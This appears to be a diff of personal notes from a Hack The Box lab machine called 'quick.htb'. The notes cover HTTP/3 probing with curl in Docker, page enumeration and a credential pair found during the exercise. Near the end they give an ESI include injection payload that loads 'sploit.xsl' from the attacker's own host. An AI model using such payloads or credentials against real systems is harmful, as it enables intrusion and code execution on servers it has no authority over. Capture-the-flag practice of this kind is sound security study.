@@ -28,10 +28,30 @@ found server-status on portal.quick.htb:9001
 curl https://portal.quick.htb:9001/server-status --http3 -v
 nmap -sU quick.htb
 
-https://hub.docker.com/r/ymuski/curl-http
-need to route this traffic through my vpn
-use other container
-docker pull dperson/openvpn-client
-
+docker container kill $(docker ps -q)
+https://hub.docker.com/r/ymuski/curl-http3
+docker pull ymuski/curl-http3
 docker run -it --rm ymuski/curl-http3 curl -ILv https://yurets.pro --http3
-docker run -it --net=container:vpn -d ymuski/curl-http3 curl -ILv https://yurets.pro --http3
+
+write python file to enumerate... but maybe brute force is not necessary...
+
+index.php
+index.php?view=contact
+index.php?view=about
+index.php?view=docs
+  docs/QuickStart.pdf
+  docs/Connectivity.pdf
+
+FOUND----------------------------------------:    
+Elisa@Wink.co.uk                                  
+Quick4cc3$$                                       
+
+portal.quick.htb:9001/search.php?search=1
+
+portal: TKT-4686
+stnd:   TKT-2323
+
+create ticket on portal
+<esi:include src="" stylesheet="http://10.10.14.5:8000/sploit.xsl"></esi:include>
+
+search on normal site
